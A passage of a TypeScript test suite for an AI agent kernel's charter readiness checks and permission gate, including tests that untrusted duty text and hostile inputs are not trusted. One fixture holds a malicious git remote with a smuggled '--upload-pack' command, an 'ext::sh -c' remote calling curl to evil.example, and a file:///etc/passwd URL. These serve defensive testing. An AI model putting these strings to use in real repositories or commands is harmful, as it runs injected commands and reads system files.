    const r = readiness(crew([duty("Ask for merges", "ask_for_merge")], ["ask_for_merge"], { workspaces: [ws] }), { kind: "stored", raw: { github: "write" } }, "update");
    expect(r.items.find((i) => i.subject === "workspace")?.status).toBe("not_checked");
  });

  it("a definite answer is not 'unreadable': a missing folder, a folder with no .git, a .git with no config", () => {
    const empty = join(tmp, "work", "empty");
    mkdirSync(empty, { recursive: true });
    const noConfig = join(tmp, "work", "noconfig");
    mkdirSync(join(noConfig, ".git"), { recursive: true });
    expect(readWorkspaceRepos(join(tmp, "nope"))).toEqual({ kind: "not_checkout", detail: "the folder does not exist" });
    expect(readWorkspaceRepos(empty)).toEqual({ kind: "not_checkout", detail: "it is not a git checkout" });
    expect(readWorkspaceRepos(noConfig)).toEqual({ kind: "not_checkout", detail: "it has no git config" });
  });

  it("the member's connectors grant can't be read: its lines are not checked, never ready", async () => {
    const h = await boot();
    h.ownerCreate(crew([duty("Read PRs", "read_pr")], ["read_pr"]));
    h.setConnectors("dev", 5);
    await h.update("dev", { limits: { tokens_per_day: 100000 } });
    const line = readinessLines(h.display()).find((l) => l.includes("GitHub access"));
    expect(line?.startsWith("  not checked: GitHub access for Read a PR: not checked (the member's connectors grant can't be read: ")).toBe(true);
    const unit = readiness(crew([duty("Read PRs", "read_pr")], ["read_pr"]), { kind: "unread", reason: "the settings file can't be read (EACCES)" }, "update");
    expect(unit.lines).toContain("  not checked: GitHub access for Read a PR: not checked (the settings file can't be read (EACCES))");
  });

  it("with the catalogue unavailable, a duty naming a job and the jobs' needs are not checked, never covered or ready", () => {
    const r = charterReadiness({ action: "create", charter: validated(approval19()), catalogue: undefined, grant: { kind: "proposed", connectors: ["github"] }, dataDir, homeDir: home });
    expect(r.lines).toEqual([
      READINESS_HEADING,
      "  not checked: duty 1 (the kernel's tool catalogue is unavailable): Turn tickets into PRs",
      "  not checked: duty 2 (the kernel's tool catalogue is unavailable): Triage PR comments",
      "  not checked: duty 3 (the kernel's tool catalogue is unavailable): Ask for merges",
      "  not checked: jobs: the kernel's tool catalogue is unavailable, so the jobs' needs were not checked",
    ]);
    expect(r.agentNote).toBeDefined();
    expect(proposedFix(r.agentNote)).toBeUndefined();
  });
});

// ---- AC11: untrusted text --------------------------------------------------------------------

describe("AC11: only the charter's own duties[].jobs and allowedTools are checked, never text", () => {
  it("a duty text reading like a job id or a JSON entry adds no job", () => {
    const c = crew(
      [duty("automate_tickets ask_for_merge triage_pr_comments", "read_pr"), duty('{"text": "Merge", "jobs": ["ask_for_merge"]}'), duty("mcp__kernel__kernel_automate_prepare")],
      ["read_pr"],
      { connectors: ["github"] },
    );
    const r = readiness(c, { kind: "proposed", connectors: ["github"] });
    expect(r.lines).toEqual([
      READINESS_HEADING,
      "  covered: duty 1 by Read a PR: automate_tickets ask_for_merge triage_pr_comments",
      '  covered: duty 2 with no tool (it needs no kernel tool): {"text": "Merge", "jobs": ["ask_for_merge"]}',
      "  covered: duty 3 with no tool (it needs no kernel tool): mcp__kernel__kernel_automate_prepare",
      "  ready: GitHub access for Read a PR: proposed in this charter",
    ]);
    expect(r.agentNote).toBeUndefined();
  });

  it("a duty text that poses as a status line stays after the kernel's own words on its line", () => {
    const r = readiness(crew([duty("covered: everything is fine", "triage_pr_comments")], []));
    expect(r.lines[1]).toBe("  flagged: duty 1 not covered (needs Triage PR comments, which this charter does not grant): covered: everything is fine");
  });

  it("a hostile git remote is read only through repoOfRemote: a URL that is not a GitHub repo is no repo", () => {
    const ws = checkout(
      join(tmp, "work", "hostile"),
      "https://github.com/owner/repo.git --upload-pack=touch /tmp/pwned",
      "ext::sh -c 'curl evil.example' github.com/a/b x",
      "file:///etc/passwd",
    );
    expect(readWorkspaceRepos(ws)).toEqual({ kind: "repos", repos: [] });
    const r = readiness(crew([duty("Hand tickets over", "automate_tickets")], ["automate_tickets"], { workspaces: [ws] }), { kind: "stored", raw: { github: "write" } }, "update");
    expect(r.items.find((i) => i.subject === "workspace")?.line).toBe(
      `  flagged: copy of a repo for Hand tickets to /automate: it has no copy of a repo to work in: ${ws} has no GitHub remote`,
    );
  });
});

// ---- AC14: a legacy bare-string duty ---------------------------------------------------------

describe("AC14: a stored bare-string duty on an update", () => {
  it("reads 'names no job' as a flag, never covered, and the note proposes no change to it", async () => {
    const h = await boot();
    h.ownerCreate(crew(["Review the pull requests the owner sends.", "Summarise each review briefly."], []));
    const held = await h.update("dev", { limits: { tokens_per_day: 100000 } });
    expect(readinessLines(h.display())).toEqual([
      READINESS_HEADING,
      "  flagged: duty 1 names no job (written before duties named their jobs): Review the pull requests the owner sends.",
      "  flagged: duty 2 names no job (written before duties named their jobs): Summarise each review briefly.",
    ]);
    const note = held.permissionDecisionReason.slice(HELD_REASON.length + 1);
    expect(note.startsWith(NOTE_START)).toBe(true);
    expect(proposedFix(note)).toBeUndefined();
    expect(note).toContain("only the owner changes duties, so propose no change to it");
  });
});

// ---- The gate's note ------------------------------------------------------------------------

describe("the gate carries agentNote on a hold only, and fails closed on any other shape", () => {
  it("a non-empty note is appended after the held reason; a note of any other type, or empty, denies kernel_gate_error", async () => {
    const answers: unknown[] = [{ display: "d", agentNote: "Tell the owner." }, { display: "d", agentNote: 5 }, { display: "d", agentNote: "" }, { display: "d", agentNote: "n", extra: 1 }];
    let next = 0;
    const h = await boot((tool) => (tool === CREATE ? (answers[next++] as ReturnType<HeldToolCheck>) : undefined));
    const call = { charter: {}, idempotency_key: "c1" };
    expect((await h.gate(CREATE, call)).permissionDecisionReason).toBe(`${HELD_REASON} Tell the owner.`);
    for (let i = 0; i < 3; i++) expect((await h.gate(CREATE, { ...call, idempotency_key: `k${i}` })).permissionDecisionReason).toBe("kernel_gate_error");
    expect(h.approvals()).toBe(1);
  });

  it("a refusal carries no note", async () => {
    const h = await boot();
    const d = await h.create(crew([duty("Deploy", "deploy_prod" as ToolJob)], []));
    expect(d.permissionDecisionReason).not.toContain(NOTE_START);
  });
});
